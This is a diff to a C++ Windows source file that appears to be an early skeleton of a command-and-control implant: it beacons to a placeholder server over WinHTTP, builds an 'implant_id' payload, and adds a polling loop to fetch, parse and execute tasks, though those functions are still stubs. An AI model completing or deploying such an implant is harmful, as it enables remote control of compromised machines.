@@ -5,7 +5,7 @@ every 10 secs check for tasks->if tasks exit dispatch->append to dictionary->pos
 #include <stdlib.h>
 #include <string>
 #include <iostream>
-#include <Windows.h>
+#include <windows.h>
 #include <winhttp.h>
 #define SERVERNAME "placeholder"
 #define SLEEP 10
@@ -24,15 +24,53 @@ void tasks()
     }
 }
 
-int makePostRequest(LPCWSTR servername, LPCWSTR subdirectory, const char *postdata){
-    DWORD datalen=strlen(postdata);
+
+//TODO
+auto getTasks(){
+
+return 1;
+}
+
+
+//TODO
+auto parseTasks(auto toParse){
+
+return 1;
+}
+
+auto executeTasks(auto tasks){
+    
+    return 1;
+}
+
+void runLoop(bool isRunning){
+    
+    while (isRunning) {
+        try {
+            const auto serverResponse = getTasks();
+            auto parsedTasks = parseTasks(serverResponse);
+            auto success = executeTasks(parsedTasks);
+        }
+        catch (const std::exception& e) {
+            printf("\nError in runLoop: %s\n", e.what());
+        }
+
+        //SET SLEEP HERE 
+    }
+
+}
+
+int makePostRequest(LPCWSTR servername, LPCWSTR subdirectory, const char *postdata)
+{
+    DWORD datalen = strlen(postdata);
     HINTERNET httpsession = WinHttpOpen(
         L"GenericAPICaller",
         WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
         WINHTTP_NO_PROXY_NAME,
         WINHTTP_NO_PROXY_BYPASS,
         0);
-    if(httpsession!=NULL){
+    if (httpsession != NULL)
+    {
         HINTERNET connectsesh = WinHttpConnect(
             httpsession,
             servername,
@@ -63,22 +101,25 @@ int makePostRequest(LPCWSTR servername, LPCWSTR subdirectory, const char *postda
                     BOOL response = WinHttpReceiveResponse(
                         request,
                         NULL);
-                    if(response==true)
+                    if (response == true)
                     {
                         DWORD bytesneeded;
-                        BOOL query= WinHttpQueryDataAvailable(
-                        request,
-                        &bytesneeded);
-                        LPSTR returnbuffer=new char[bytesneeded+1];
-                        if(query==TRUE){
-                            if(returnbuffer){
-                                ZeroMemory(returnbuffer, bytesneeded+1);
-                                BOOL dataread=WinHttpReadData(
-                                request,
-                                returnbuffer,
-                                bytesneeded+1,
-                                NULL);
-                                if(dataread==TRUE){
+                        BOOL query = WinHttpQueryDataAvailable(
+                            request,
+                            &bytesneeded);
+                        LPSTR returnbuffer = new char[bytesneeded + 1];
+                        if (query == TRUE)
+                        {
+                            if (returnbuffer)
+                            {
+                                ZeroMemory(returnbuffer, bytesneeded + 1);
+                                BOOL dataread = WinHttpReadData(
+                                    request,
+                                    returnbuffer,
+                                    bytesneeded + 1,
+                                    NULL);
+                                if (dataread == TRUE)
+                                {
                                     return 0;
                                 }
                             }
@@ -88,9 +129,8 @@ int makePostRequest(LPCWSTR servername, LPCWSTR subdirectory, const char *postda
             }
         }
     }
-return -1;
+    return -1;
 }
-
 
 int sendresults()
 {
@@ -120,7 +160,6 @@ char *random_id()
 
 char *make_base_payload(char *implant_id)
 {
-
     char payload[51] = "{\"implant_id\": }";
     char *payloadptr = payload;
     strcat(payload, implant_id);
@@ -129,5 +168,6 @@ char *make_base_payload(char *implant_id)
 
 int main(int argc, char *argv[])
 {
-return 0;
+    runLoop(true);
+    return 0;
 }
